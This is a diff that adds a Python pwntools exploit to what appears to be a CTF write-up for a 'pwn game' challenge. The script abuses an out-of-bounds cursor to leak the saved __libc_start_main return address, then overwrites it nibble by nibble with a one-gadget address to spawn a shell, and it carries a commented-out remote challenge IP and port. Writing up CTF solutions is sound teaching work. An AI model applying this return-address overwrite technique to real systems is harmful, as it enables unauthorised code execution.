@@ -633,6 +633,101 @@ The overall strategy is unchanged.
 <div id="terminal-exploit"></div>
 <script>render_typescript("exploit.typescript","terminal-exploit",30);  </script>
 
+```python
+import pwn
+import sys
+import re
+
+#game_sequences
+out_of_bounds = "ssddadsdwwwwwwwaawasssssssssssaawwaaawwwwwwwwwwwwwww"
+jump_libc_ret = "w"*(255-236)
+loop = "d"*9 + "w"*(236-23) + "a"*7 + "-"*20 + "q"
+
+#leak saved_rip return address
+def leak_and_loop(r):
+    r.recvuntil("============ TUTORIAL ============")
+    for i in xrange(6):
+        r.sendline("")
+    r.recvuntil("RENDER SINGLE IMAGE")
+
+    #jump to byte
+    for c in out_of_bounds + jump_libc_ret:
+        r.send(c)
+        data = r.recvuntil("CONTROLS:")
+
+    #leak return address
+    leak = 0
+    for i in xrange(8):
+        leak |= int(re.findall("[0-9a-f]+ -> [0-9a-f]+", data.replace("\n", ""))[0][:2], 16) << (8*i)
+        r.send("d")
+        data = r.recvuntil("CONTROLS:")
+    print "leak: 0x%x" % leak
+
+    r.send(loop)
+
+    return leak
+
+#move to __libc_start_main return address, write byte and loop
+def write_and_loop(r, value):
+    r.recvuntil("============ TUTORIAL ============")
+    for i in xrange(6):
+        r.sendline("")
+    r.recvuntil("RENDER SINGLE IMAGE")
+
+    sequence = out_of_bounds + jump_libc_ret + value + loop
+    r.send(sequence)
+    print sequence
+
+
+#local
+ret_libc_start_main = 0x24223
+r = pwn.process("./challenge")
+#pwn.gdb.attach(r)
+
+#remote
+#ret_libc_start_main = 0x202e1
+#r = pwn.remote("195.201.127.177", 9999)
+
+#leak and compute target rip
+saved_rip = leak_and_loop(r)
+magic_gadget = int(sys.argv[1], 16) + saved_rip - ret_libc_start_main
+print "magic_gadget: 0x%x" % magic_gadget
+
+#write target rip
+byte_offset = ""
+while magic_gadget != saved_rip:
+    #write lower nibble
+    n = (magic_gadget&0xf) - (saved_rip&0xf)
+    print n, magic_gadget&0xf, saved_rip&0xf
+    if n > 0:
+        write_and_loop(r, byte_offset + "+"*n)
+    elif n < 0:
+        write_and_loop(r, byte_offset + "-"*-n)
+    magic_gadget = magic_gadget >> 4
+    saved_rip = saved_rip >> 4
+
+    #write upper nibble
+    n = (magic_gadget&0xf) - (saved_rip&0xf)
+    print n, magic_gadget&0xf, saved_rip&0xf
+    if n > 0:
+        write_and_loop(r, byte_offset + "1"*n)
+    elif n < 0:
+        write_and_loop(r, byte_offset + "2"*-n)
+    saved_rip = saved_rip >> 4
+    magic_gadget = magic_gadget >> 4
+    byte_offset += "d"
+
+# exit the game
+r.recvuntil("============ TUTORIAL ============")
+for i in xrange(6):
+    r.sendline("")
+r.sendline("q")
+r.recvuntil("PRESS ENTER TO EXIT!")
+r.sendline("")
+
+r.interactive()
+```
+
 # Files
 - [Exploit](exploit.py)
 - [Challenge.tar.xz](pwn game-fd561b730951afff.tar.xz)
